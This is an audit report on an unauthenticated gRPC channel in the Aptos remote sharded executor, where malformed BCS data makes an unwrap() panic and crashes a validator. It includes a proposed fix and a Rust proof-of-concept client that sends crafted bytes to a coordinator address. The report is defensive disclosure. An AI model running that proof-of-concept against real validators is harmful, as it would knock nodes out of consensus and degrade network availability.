# Audit Report

## Title
Unauthenticated Remote Executor Shard Communication Allows Denial of Service via Malformed Serialization

## Summary
The remote sharded block executor implementation lacks authentication for network communication between the coordinator and executor shards. An attacker with network access can send malformed BCS-serialized data to the coordinator, causing deserialization to panic and crashing the validator's block execution engine. This results in a complete loss of consensus participation and validator availability.

## Finding Description

The sharded block executor system supports distributed execution across multiple machines via `RemoteExecutorClient`. This implementation uses a GRPC-based `NetworkController` for communication between the coordinator (running on the validator) and remote executor shards.

**Critical Security Flaws:**

1. **No Authentication on Network Layer**: The GRPC service accepts messages from any network peer without authentication or authorization. [1](#0-0) 

The `simple_msg_exchange` function accepts any incoming `NetworkMessage` and routes it based solely on `message_type`, with no validation of the sender's identity or authority.

2. **Unchecked Deserialization with Panic**: The coordinator deserializes received execution results using `.unwrap()`, which panics on any deserialization error. [2](#0-1) 

The `get_output_from_shards()` method receives bytes from the network and deserializes them without error handling. The `.unwrap()` call on line 168 will cause a thread panic if the BCS deserialization fails.

**Attack Path:**

1. A validator operator configures remote sharded execution by setting remote executor addresses. [3](#0-2) 

2. The coordinator listens on a network port for messages from executor shards. [4](#0-3) 

3. An attacker discovers the coordinator's network address (through reconnaissance, misconfiguration, or network infiltration).

4. The attacker connects to the coordinator's GRPC service and sends a message with:
   - `message_type`: `"execute_result_0"` (or any valid shard ID)
   - `message`: Malformed BCS bytes (e.g., invalid type tags, truncated data, corrupted structure)

5. The coordinator's `get_output_from_shards()` receives the malformed bytes and attempts deserialization.

6. `bcs::from_bytes()` returns an error, causing `.unwrap()` to panic.

7. The coordinator thread crashes, block execution fails, and the validator stops participating in consensus.

**Invariants Broken:**
- **Resource Limits Invariant**: The system should gracefully handle malformed inputs without crashing
- **Availability Invariant**: Validators should remain operational under network attacks
- **Deterministic Execution Invariant**: Block execution should complete successfully or fail gracefully

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos Bug Bounty program:
- **"Validator node slowdowns"** - The validator becomes completely unavailable
- **"API crashes"** - The block executor crashes, preventing all transaction processing
- **"Significant protocol violations"** - Loss of consensus participation violates liveness guarantees

**Affected Components:**
- Validator block execution engine
- Consensus participation (validator cannot propose or validate blocks)
- Network liveness (if multiple validators are affected)

**Scope of Damage:**
- Single validator: Complete unavailability until restart
- Multiple validators: Network liveness degradation, slower block production
- Repeated attacks: Persistent denial of service

This does not reach Critical severity because:
- It does not cause consensus safety violations (other validators continue correctly)
- It does not result in fund theft or permanent state corruption
- It requires opt-in configuration (remote sharded execution)
- Recovery is possible via restart (though availability is lost)

## Likelihood Explanation

**Likelihood: MEDIUM-HIGH**

**Prerequisites for Exploitation:**
1. Validator must enable remote sharded execution (opt-in configuration)
2. Attacker must gain network access to the coordinator's GRPC port
3. Attacker must know or discover the port number and message format

**Ease of Exploitation:**
- Once prerequisites are met, exploitation is trivial
- No authentication bypass needed (authentication doesn't exist)
- No complex cryptographic operations required
- Simple GRPC client can send malformed bytes
- Attack can be automated and repeated

**Real-World Scenarios:**
- **Misconfigured Firewall**: Validator exposes internal ports to public internet
- **Cloud Environment Misconfiguration**: Internal service ports accessible via cloud networking
- **Compromised Network**: Attacker gains access to validator's internal network
- **Supply Chain Attack**: Malicious monitoring/management tools with network access

**Mitigating Factors:**
- Remote sharded execution is likely used only by high-performance validators
- Proper network segmentation should prevent external access
- Monitoring systems would detect repeated crashes

## Recommendation

**Immediate Mitigation:**
1. Implement mutual TLS authentication between coordinator and executor shards
2. Add graceful error handling for deserialization failures

**Code Fix:** [2](#0-1) 

Replace the vulnerable `get_output_from_shards()` method with proper error handling:

```rust
fn get_output_from_shards(&self) -> Result<Vec<Vec<Vec<TransactionOutput>>>, VMStatus> {
    trace!("RemoteExecutorClient Waiting for results");
    let mut results = vec![];
    for (shard_id, rx) in self.result_rxs.iter().enumerate() {
        let received_bytes = rx
            .recv()
            .map_err(|e| {
                error!("Failed to receive from shard {}: {:?}", shard_id, e);
                VMStatus::Error {
                    status_code: StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR,
                    sub_status: None,
                    message: Some(format!("Shard {} communication failure", shard_id)),
                }
            })?
            .to_bytes();
            
        let result: RemoteExecutionResult = bcs::from_bytes(&received_bytes)
            .map_err(|e| {
                error!("Failed to deserialize result from shard {}: {:?}", shard_id, e);
                VMStatus::Error {
                    status_code: StatusCode::UNKNOWN_INVARIANT_VIOLATION_ERROR,
                    sub_status: None,
                    message: Some(format!("Shard {} sent malformed data", shard_id)),
                }
            })?;
            
        results.push(result.inner?);
    }
    Ok(results)
}
```

**Long-Term Solution:**

1. **Add Authentication Layer**: Integrate with Aptos network authentication framework using Noise protocol with mutual authentication. [5](#0-4) 

Modify `NetworkController` to support authenticated connections with peer identity verification.

2. **Input Validation**: Add size limits and structural validation before deserialization:
   - Maximum message size checks
   - Expected data structure validation
   - Checksum/signature verification

3. **Monitoring and Rate Limiting**: 
   - Detect repeated deserialization failures
   - Rate limit connections per peer
   - Alert operators on suspicious activity

4. **Network Segmentation**: Document best practices for isolating executor shard communication on private networks.

## Proof of Concept

**Attack Simulation:**

```rust
// File: exploit_remote_executor.rs
// Demonstrates the deserialization panic vulnerability

use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tokio::runtime::Runtime;

fn main() {
    let rt = Runtime::new().unwrap();
    
    // Coordinator address (example)
    let coordinator_addr = "http://validator-coordinator:52200";
    
    rt.block_on(async {
        // Connect to coordinator
        let mut client = NetworkMessageServiceClient::connect(coordinator_addr)
            .await
            .expect("Failed to connect");
        
        // Craft malformed BCS data
        // This is intentionally invalid: wrong type tag, truncated data
        let malformed_data = vec![
            0xFF, 0xFF, 0xFF, 0xFF,  // Invalid BCS header
            0x00, 0x01, 0x02,         // Truncated/invalid data
        ];
        
        // Send to coordinator claiming to be shard 0
        let request = tonic::Request::new(NetworkMessage {
            message: malformed_data,
            message_type: "execute_result_0".to_string(),
        });
        
        match client.simple_msg_exchange(request).await {
            Ok(_) => {
                println!("Message sent successfully");
                println!("Coordinator should panic on deserialization");
            }
            Err(e) => {
                println!("Error: {:?}", e);
            }
        }
    });
}
```

**Expected Outcome:**
- Coordinator receives the malformed message
- `bcs::from_bytes().unwrap()` panics with "called `Result::unwrap()` on an `Err` value"
- Coordinator thread crashes
- Block execution fails
- Validator stops participating in consensus

**Verification Steps:**
1. Deploy a validator with remote sharded execution enabled
2. Run the exploit code targeting the coordinator
3. Observe coordinator logs showing panic
4. Verify validator stops producing/validating blocks
5. Confirm consensus continues with remaining validators

## Notes

This vulnerability only affects validators that explicitly configure remote sharded execution. The `LocalExecutorClient` (in-process execution) is not affected as it uses trusted crossbeam channels rather than network communication. [6](#0-5) 

The vulnerability is activated when `get_remote_addresses()` returns non-empty addresses, triggering the use of `REMOTE_SHARDED_BLOCK_EXECUTOR`.

However, validators using remote sharded execution are likely high-performance nodes critical to network operation, making this a significant availability risk for the network as a whole.

### Citations

**File:** secure/net/src/grpc_network_service/mod.rs (L92-116)
```rust
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** execution/executor-service/src/remote_executor_client.rs (L35-44)
```rust
pub fn set_remote_addresses(addresses: Vec<SocketAddr>) {
    REMOTE_ADDRESSES.set(addresses).ok();
}

pub fn get_remote_addresses() -> Vec<SocketAddr> {
    match REMOTE_ADDRESSES.get() {
        Some(value) => value.clone(),
        None => vec![],
    }
}
```

**File:** execution/executor-service/src/remote_executor_client.rs (L94-145)
```rust
    pub fn new(
        remote_shard_addresses: Vec<SocketAddr>,
        mut controller: NetworkController,
        num_threads: Option<usize>,
    ) -> Self {
        let num_threads = num_threads.unwrap_or_else(num_cpus::get);
        let thread_pool = Arc::new(
            rayon::ThreadPoolBuilder::new()
                .num_threads(num_threads)
                .build()
                .unwrap(),
        );
        let controller_mut_ref = &mut controller;
        let (command_txs, result_rxs) = remote_shard_addresses
            .iter()
            .enumerate()
            .map(|(shard_id, address)| {
                let execute_command_type = format!("execute_command_{}", shard_id);
                let execute_result_type = format!("execute_result_{}", shard_id);
                let command_tx = Mutex::new(
                    controller_mut_ref.create_outbound_channel(*address, execute_command_type),
                );
                let result_rx = controller_mut_ref.create_inbound_channel(execute_result_type);
                (command_tx, result_rx)
            })
            .unzip();

        let state_view_service = Arc::new(RemoteStateViewService::new(
            controller_mut_ref,
            remote_shard_addresses,
            None,
        ));

        let state_view_service_clone = state_view_service.clone();

        let join_handle = thread::Builder::new()
            .name("remote-state_view-service".to_string())
            .spawn(move || state_view_service_clone.start())
            .unwrap();

        controller.start();

        Self {
            network_controller: controller,
            state_view_service,
            _join_handle: Some(join_handle),
            command_txs: Arc::new(command_txs),
            result_rxs,
            thread_pool,
            phantom: std::marker::PhantomData,
        }
    }
```

**File:** execution/executor-service/src/remote_executor_client.rs (L163-172)
```rust
    fn get_output_from_shards(&self) -> Result<Vec<Vec<Vec<TransactionOutput>>>, VMStatus> {
        trace!("RemoteExecutorClient Waiting for results");
        let mut results = vec![];
        for rx in self.result_rxs.iter() {
            let received_bytes = rx.recv().unwrap().to_bytes();
            let result: RemoteExecutionResult = bcs::from_bytes(&received_bytes).unwrap();
            results.push(result.inner?);
        }
        Ok(results)
    }
```

**File:** secure/net/src/network_controller/mod.rs (L72-92)
```rust
/// NetworkController is the main entry point for sending and receiving messages over the network.
/// 1. If a node acts as both client and server, albeit in different contexts, GRPC needs separate
///    runtimes for client context and server context. Otherwise we a hang in GRPC. This seems to be
///    an internal bug in GRPC.
/// 2. We want to use tokio runtimes because it is best for async IO and tonic GRPC
///    implementation is async. However, we want the rest of the system (remote executor service)
///    to use rayon thread pools because it is best for CPU bound tasks.
/// 3. NetworkController, InboundHandler and OutboundHandler work as a bridge between the sync and
///    async worlds.
/// 4. We need to shutdown all the async tasks spawned by the NetworkController runtimes, otherwise
///    the program will hang, or have resource leaks.
#[allow(dead_code)]
pub struct NetworkController {
    inbound_handler: Arc<Mutex<InboundHandler>>,
    outbound_handler: OutboundHandler,
    inbound_rpc_runtime: Runtime,
    outbound_rpc_runtime: Runtime,
    inbound_server_shutdown_tx: Option<oneshot::Sender<()>>,
    outbound_task_shutdown_tx: Option<Sender<Message>>,
    listen_addr: SocketAddr,
}
```

**File:** execution/executor/src/workflow/do_get_execution_output.rs (L256-276)
```rust
    fn execute_block_sharded<V: VMBlockExecutor>(
        partitioned_txns: PartitionedTransactions,
        state_view: Arc<CachedStateView>,
        onchain_config: BlockExecutorConfigFromOnchain,
    ) -> Result<Vec<TransactionOutput>> {
        if !get_remote_addresses().is_empty() {
            Ok(V::execute_block_sharded(
                &REMOTE_SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        } else {
            Ok(V::execute_block_sharded(
                &SHARDED_BLOCK_EXECUTOR.lock(),
                partitioned_txns,
                state_view,
                onchain_config,
            )?)
        }
    }
```
